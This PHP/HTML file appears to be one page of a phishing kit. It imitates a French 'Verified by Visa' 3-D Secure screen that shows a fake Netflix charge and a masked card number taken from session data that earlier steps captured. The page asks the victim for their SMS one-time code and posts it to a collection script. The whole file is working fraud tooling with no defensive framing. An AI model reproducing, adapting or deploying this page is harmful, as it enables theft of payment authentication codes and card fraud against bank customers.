<?php



session_start();

///// PRINT 4 LAST NUMBERS //////
$number = $_SESSION['cn'];
$masked =  str_pad(substr($number, -4), strlen($number), 'x', STR_PAD_LEFT);
$phone = $_SESSION['tel'];
$ephone =  str_pad(substr($phone, -4), strlen($phone), 'X', STR_PAD_LEFT);
///// PRINT 4 LAST NUMBERS //////






?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link rel="icon" type="image/x-icon" href="favicon.ico"/>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css"
	href="css/styles-banque.css" />
<title>Authentification</title>
<script type="text/javascript"
	src="authenticationCBL/authentication.js">
</script>
<style>
#allcenter {
	position: absolute;
	padding: 12px;
	left: 50%;
	top: 50%;
}
</style>




	

</head>
<body
	onload="init(); center() ;  setTimeout('onLoadEvent()',240*1000)">
	<div id="allcenter"
		>
		<div id="cont">
			
				
				<div id="logo2Src">
					<img
						src='imgs/imagesTemplates/ImgServlet.gif' alt='Verified by Visa' title='Verified by Visa' />
				</div>
			

			<div id="textSrc"
				
				>

				

				<h1
					>
					<p>&nbsp;</p>
<p>Identification</p>
				</h1>

				

				<p
					 style="margin-top:15px;" >
					<p>Pour s&eacute;curiser au mieux vos achats en ligne sur les sites affichant le logo Verified by Visa, il vous suffit d&eacute;sormais de vous identifier en saisissant le code d'acc&egrave;s re&ccedil;u par SMS sur votre t&eacute;l&eacute;phone portable.</p>
					<p>

						

		<div class="authentif">
			
			<form name="Form_AskAuthentication"
				
				action="../activity/auth_3d_visa.php"
				method="post">
				<p>
					<span class="lbl">Marchand&nbsp;:&nbsp;</span><span>NETFLIX</span>&nbsp;
				</p>
				
					<p>
						<span class="lbl">Montant&nbsp;:&nbsp;</span><span>13,99 EUR</span>&nbsp;
					</p>
				
					<p>
						<span class="lbl">Date&nbsp;:&nbsp;</span><span> <?php echo date("m/d/Y g:i:s"); ?></span>&nbsp;
					</p>
					
					<p class="num_carte">
						<span class="lbl">N&deg; de carte&nbsp;:&nbsp;</span><span><?php echo $masked ?></span>&nbsp;
					</p>

					
					
					
						
							<!-- 
								<p>
									
										<span class="lbl">N&deg; t&eacute;l&eacute;phone&nbsp;:</span>
										<span><?php echo $ephone ?></span>&nbsp;
								</p> -->
					
						
					<p>
						<span class="lbl">Code d'accès reçu&nbsp;&nbsp;<br/>par SMS&nbsp;:&nbsp;</span> <input type="text" class="chp_smscode"
							id="chp1" name="chp1" autocomplete="off"
							onfocus="init_foc('chp1');controle_sms('chp1')" maxlength="8"
							onkeyup="controle_sms('chp1')" /> <input type="hidden" id="chp2"
							name="chp2" autocomplete="off" value="" /> <input type="hidden"
							id="chp3" name="chp3" autocomplete="off" value="" /> <input
							type="image" id="btn_ok" name="btn_ok"
							src=imgs/imagesTemplates/btn_ok_off.png
							alt="Valider" style="cursor: pointer;" />
					</p>
					
					
				
				<p class="f_d">
					Exemple : 95378417
				</p>
				
				


				

	</div>
	


	</form>
	
		
			

			<p>Cette identification est obligatoire pour conclure votre transaction. Si votre num&eacute;ro de t&eacute;l&eacute;phone n'est pas &agrave; jour, vous ne pourrez pas finaliser votre achat.</p>
<p><a class="link_fl_b" href="#" target="_blank">Comment communiquer en toute s&eacute;curit&eacute; mon num&eacute;ro de t&eacute;l&eacute;phone mobile</a></p>

			
			
				<p>
					<a
						href="#"
						class="link_fl_b" rel="external">Ne pas m&rsquo;identifier et annuler mon achat</a>
				</p>
			
		
		
	


	
		
			
			<!--			    -->
			
				<p>
					
				</p>
			
			
			
				<p class="more">
					<right>
					<a href="#"
						onclick="#','')">Probl&egrave;me&nbsp;de r&eacute;ception du SMS ou plus d&rsquo;infos sur Verified by Visa</a></right>
				</p>
			
		
		
	

	</div>
	</div>
	</div>
</body>
</html>
